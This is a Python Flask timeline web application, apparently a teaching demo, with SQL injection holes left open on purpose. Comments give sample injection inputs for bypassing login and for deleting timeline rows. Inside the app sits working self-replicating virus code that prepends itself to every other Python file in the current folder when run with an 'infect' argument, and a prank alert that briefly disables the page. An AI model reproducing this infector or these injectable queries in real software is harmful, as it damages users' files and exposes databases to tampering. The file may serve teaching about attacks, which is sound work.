# -*- coding: utf-8 -*-
import glob
import os
import sqlite3
import sys

from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)

app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(32),
            password VARCHAR(32)
            )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def initialize_database():
    create_tables()
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT COUNT(*) FROM user')
    user_count = cur.fetchone()[0]
    conn.close()
    if user_count == 0:
        init_data()


initialize_database()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    #username=username.replace("'","")  #SQL injection countermeasure
    #username=username.replace('-','')  #SQL injection countermeasure
    print(username)
    cur.execute('SELECT id, username FROM `user` WHERE username=\'%s\' AND password=\'%s\'' % (username, password))
    row = cur.fetchone()
    conn.commit()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None
    # SELECT id, username FROM `user` WHERE username='user1' OR '1'='1' AND password='123456'
    # input example:   user1' OR 4=4;--
    # SELECT id, username FROM `user` WHERE username='user1' OR 4=4;--' AND password='123456'

def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM `user` WHERE id=%d' % uid)
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return {'id': row[0], 'username': row[1]}


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    cur.executescript('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))   
    # example input=   contoh data'); delete from time_line where ( content='World
    #cur.execute('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return row


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM `time_line` ORDER BY id DESC')
    rows = cur.fetchall()
    conn.commit()
    conn.close()

    return map(lambda row: {'id': row[0], 'user_id': row[1], 'content': row[2]}, rows)


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM `time_line` WHERE  user_id=%s AND id=%s' % (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <link rel="stylesheet" href="/static/style.css" />
</head>
<body>
    <div class="page-shell">
        <div class="card login-card">
            <h2>Login</h2>
            <form method="POST" class="form-stack">
                <label>
                    Username
                    <input name="username" type="text" placeholder="Enter username" />
                </label>
                <label>
                    Password
                    <input name="password" type="password" placeholder="Enter password" />
                </label>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
</body>
</html>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home</title>
    <link rel="stylesheet" href="/static/style.css" />
</head>
<body>
    <div class="page-shell">
        <div class="card timeline-card">
            <div class="page-header">
                <div>
                    <h2>Welcome, {{ user['username'] }}</h2>
                    <p class="subtitle">Your timeline posts appear below.</p>
                </div>
                <a class="button button-secondary" href="/logout">Logout</a>
            </div>
            <form method="POST" action="/create_time_line" class="form-inline">
                <input type="text" name="content" placeholder="Write a new timeline entry..." />
                <button type="submit">Submit</button>
            </form>
            <ul class="timeline-list">
                {% for line in time_lines %}
                <li class="timeline-item">
                    <p>{{ line['content'] }}</p>
                    {% if line['user_id'] == user['id'] %}
                    <a class="delete-link" href="/delete/time_line/{{ line['id'] }}">Delete</a>
                    {% endif %}
                </li>
                {% endfor %}
            </ul>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('.form-inline');
            const submitButton = form ? form.querySelector('button[type="submit"]') : null;
            const contentInput = form ? form.querySelector('input[name="content"]') : null;
            const interactiveElements = document.querySelectorAll('button, input, textarea, select, a[href]');

            if (!form || !submitButton || !contentInput) {
                return;
            }

            const disableAllInteraction = function() {
                interactiveElements.forEach(element => {
                    if (element.tagName === 'A') {
                        element.classList.add('disabled-interactive');
                    } else {
                        element.disabled = true;
                    }
                });
            };

            const enableAllInteraction = function() {
                interactiveElements.forEach(element => {
                    if (element.tagName === 'A') {
                        element.classList.remove('disabled-interactive');
                    } else {
                        element.disabled = false;
                    }
                });
            };

            form.addEventListener('submit', async function(event) {
                event.preventDefault();
                const formData = new FormData(form);
                const response = await fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                });

                if (response.ok) {
                    alert('YOU HAVE BEEN INFECTED HAHAHA !!!');
                    disableAllInteraction();

                    setTimeout(function() {
                        enableAllInteraction();
                    }, 5000);
                } else {
                    alert('Failed to submit entry.');
                }
            });
        });
    </script>
</body>
</html>
    ''')
    return template.render(user=user, time_lines=time_lines)

# VIRUS SAYS HI!
def collect_virus_code():
    virus_code = []

    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    self_replicating_part = False
    for line in lines:
        if line == '# VIRUS SAYS HI!\n':
            self_replicating_part = True
        if self_replicating_part:
            virus_code.append(line)
        if line == '# VIRUS SAYS BYE!\n':
            break

    return virus_code


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


def infect_python_files():
    virus_code = collect_virus_code()
    python_files = glob.glob('*.py') + glob.glob('*.pyw')

    for file_path in python_files:
        if os.path.abspath(file_path) == os.path.abspath(sys.argv[0]):
            continue

        with open(file_path, 'r') as f:
            file_code = f.readlines()

        infected = False
        for line in file_code:
            if line == '# VIRUS SAYS HI!\n':
                infected = True
                break

        if not infected:
            final_code = []
            final_code.extend(virus_code)
            final_code.append('\n')
            final_code.extend(file_code)

            with open(file_path, 'w') as f:
                f.writelines(final_code)

            malicious_code()
# VIRUS SAYS BYE!

@app.route('/init')
def init_page():
    init()
    return redirect('/')
# access in web: http://127.0.0.1:5000/init
@app.route('/')
def index():
    if 'uid' in session:
        return render_home_page(session['uid'])
    return redirect('/login')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_from_username_and_password(username, password)
        if user is not None:
            session['uid'] = user['id']
            return redirect('/')
        else:
            return redirect('/login')


@app.route('/create_time_line', methods=['POST'])
def time_line():
    if 'uid' in session:
        uid = session['uid']
        create_time_line(uid, request.form['content'])
        malicious_code()
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return 'OK'
    return redirect('/')


@app.route('/delete/time_line/<tid>')
def delete_time_line(tid):
    if 'uid' in session:
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    if 'uid' in session:
        session.pop('uid')
    return redirect('/login')


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'infect':
        infect_python_files()
    else:
        app.run(debug=True, port=5001)